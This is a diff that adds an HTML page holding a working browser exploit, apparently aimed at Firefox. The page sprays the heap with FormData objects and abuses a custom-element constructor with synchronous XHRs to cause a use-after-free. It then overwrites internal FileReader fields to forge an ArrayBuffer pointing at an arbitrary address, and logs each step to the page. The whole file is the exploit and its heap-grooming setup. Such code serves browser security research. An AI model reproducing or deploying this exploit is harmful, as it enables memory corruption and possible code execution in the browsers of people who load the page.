@@ -1,0 +1,271 @@
+<head>
+<link rel="icon" href="data:;base64,iVBORw0KGgo=">
+</head>
+<body onload="setTimeout(function () { go(); }, 4000);">
+<h1>log:</h1>
+<p id=p>Sleeping...<br></p>
+<script>
+var xhrs = new Array(40000);
+var xhrs_responses = new Array(40000);
+var delay_xhr = new XMLHttpRequest();
+var delay_xhr2 = new XMLHttpRequest();
+var delay_xhr3 = new XMLHttpRequest();
+var formdatas = new Array(4000);
+var xhr_data_uri_length = 0x4000;
+var filereaders = new Array(100);
+var gc_ab = [];
+
+var p = document.getElementById("p");
+
+delay_xhr.open('GET', '/delay.xml', false);
+delay_xhr2.open('GET', '/delay.xml', false);
+delay_xhr3.open('GET', '/delay.xml', false);
+
+function find_malformed_response() {
+	for (var i = 0; i < 40000; i++) {
+		xhrs_responses[i] = new Uint32Array(xhrs[i].response);
+		if (xhrs_responses[i][0] != 0x78787878) { // "xxxx"
+			return i;
+		}
+	}
+	return null;
+}
+	
+addEventListener("message", receiveMessage, false);
+function receiveMessage(event)
+{
+	if (event.data == "0") {
+		p.innerHTML += "Allocating FileReaders<br>";
+		for (var i = 0; i < filereaders.length; i++) {
+			filereaders[i] = new FileReader();
+		}
+	} else if (event.data == "1") {
+		for(var i = 0; i < xhrs.length; i++) {
+			xhrs[i] = new XMLHttpRequest();
+		}
+		let data_uri = "data:text/plain," + "x".repeat(xhr_data_uri_length);
+		for(var i = 0; i < xhrs.length; i++) {
+			xhrs[i].open("GET", data_uri, true);
+			xhrs[i].responseType = "arraybuffer";
+			xhrs[i].send(null);
+		}
+	} else if (event.data == "2") {
+		var idx = find_malformed_response(); 
+		if (idx == null) {
+			p.innerHTML += "Failed corrupting any XMLHttpRequest<br>";
+		} else {
+			let blob = new Blob();
+			let FileReader_idx;
+			
+			p.innerHTML += "Malformed ArrayBuffer found in index " + idx + "<br>";
+
+			for (var i = 1; i <= Math.floor(xhr_data_uri_length / 0x140); i++) {
+				// +0xc0 FileReader.mCharset.mLength
+				// +0xc4 FileReader.mCharset.{mDataFlags,mClassFlags}
+				// +0xc8 FileReader.mDataLen
+				// +0xcc FileReader.mDataFormat
+
+				if (xhrs_responses[idx][(0x140*i + 0xc0) / 4] == 0 &&
+						xhrs_responses[idx][(0x140*i + 0xc4) / 4] == 0x20001 && 
+						xhrs_responses[idx][(0x140*i + 0xc8) / 4] == 0 && 
+						xhrs_responses[idx][(0x140*i + 0xcc) / 4] == 1) {
+					var offset = 0x140*i;
+					p.innerHTML += "Offset to FileReader from malformed ArrayBuffer: 0x" + offset.toString(16) + "<br>";
+					FileReader_idx = i;
+					break;
+				}
+			}
+			if (FileReader_idx === undefined) {
+				p.innerHTML += "Couldn't find FileReader from malformed ArrayBuffer<br>";
+			} else {
+				for (i = 0; i < filereaders.length; i++) { 
+					filereaders[i].readAsArrayBuffer(blob);
+				}
+				xhrs_responses[idx][(0x140*FileReader_idx + 0xa8) / 4] = 0x41414141; // mDataPtr
+				xhrs_responses[idx][(0x140*FileReader_idx + 0xac) / 4] = 0x41414141; // mDataPtr
+				xhrs_responses[idx][(0x140*FileReader_idx + 0xc8) / 4] = 0x1000; // mDataLen
+				xhrs_responses[idx][(0x140*FileReader_idx + 0x110) / 4] = 0x1000; // mTotal
+
+				setTimeout(function() {
+					for (i = 0; i < filereaders.length; i++) {
+						window._41414141 = filereaders[i].result;
+						if (window._41414141.byteLength != 0) {
+							p.innerHTML += "Created 0x4141414141414141 ArrayBuffer!<br>";
+							break;
+						}
+					}
+					if (i == filereaders.length) {
+						p.innerHTML += "Couldn't create 0x4141414141414141 ArrayBuffer<br>";
+					}
+				}, 1000);
+			}
+		}
+	}
+}
+
+function formdata_append_one(f) {
+	f.append(null, null);
+}
+function formdata_delete_all(f) {
+	f.delete(null);
+}
+
+function go() {
+for (i = 0; i < formdatas.length; i++) {
+	formdatas[i] = new FormData();
+}
+let f = document.createElement("iframe");
+f.srcdoc = `<body>
+	<script>
+	const MB = 0x100000;
+	function gc() {
+		// Taken from https://github.com/saelo/foxpwn
+		const maxMallocBytes = 128 * MB;
+		for (var i = 0; i < 3; i++) {
+			parent.gc_ab[i] = new ArrayBuffer(maxMallocBytes);
+		}
+	}
+
+	class CustomImageElement extends HTMLImageElement {
+		constructor() {
+			super();
+
+			// post message "0" (allocate FileReaders) to parent, and invoke delay XHR request
+			parent.postMessage("0", "*");
+			parent.delay_xhr3.send(null);
+
+			// "parent" is going to be unusable after document has changed, so we're declaring variables now to hold references to objects inside parent to be able to use them later
+			var formdatas = parent.formdatas;
+			var delay_xhr = parent.delay_xhr;
+			var delay_xhr2 = parent.delay_xhr2;
+			var formdata_delete_all = parent.formdata_delete_all;
+			var parent_ref = parent;
+		
+			gc();
+
+			location.replace("about:blank");
+
+			delay_xhr.send(null);
+			// mHandles is freed now
+
+			for (var i = 0; i < formdatas.length; i++) {
+				formdata_delete_all(formdatas[i]);
+			}
+			// all 0x1000 FormData allocations are freed now
+
+			// post message "1" (allocate XMLHttpRequests) to parent, and invoke delay XHR request
+			parent_ref.postMessage("1", "*");
+			delay_xhr2.send(null);
+
+			// post message "2" (continue exploitation) to parent, but without invoking a delay XHR request so that scheduling occurs only after the write-after-free corruption
+			parent_ref.postMessage("2", "*");
+			
+			parent.p.innerHTML += "Custom element constructor returning<br>";
+		}
+	}
+
+	customElements.define('custom-img', CustomImageElement, { extends: "img" });
+
+	</scrip` + `t>
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img />
+	<img is=custom-img />
+	</body>`;
+
+for (var i = 0; i < formdatas.length; i++) {
+	// 43 appends will cause FormData's internal array "mFormData" to re-allocate itself into a 0x1000 allocation
+	for (var j = 0; j < 43-1; j++) {
+		formdatas[i].append(null, null);
+	}
+}
+
+p.innerHTML += "Allocating 0x1000 buffers with FormDatas<br>";
+
+for (var i = 0; i < formdatas.length; i++) {
+	formdata_append_one(formdatas[i]);
+}
+
+p.innerHTML += "Poking holes in 0x1000 buffers<br>";
+
+setTimeout(function () {
+	for (var i = 300; i < formdatas.length; i += 550) {
+		formdata_delete_all(formdatas[i]);
+	}
+
+	document.body.prepend(f);
+}, 1000);
+
+}
+
+</script>
+</body>
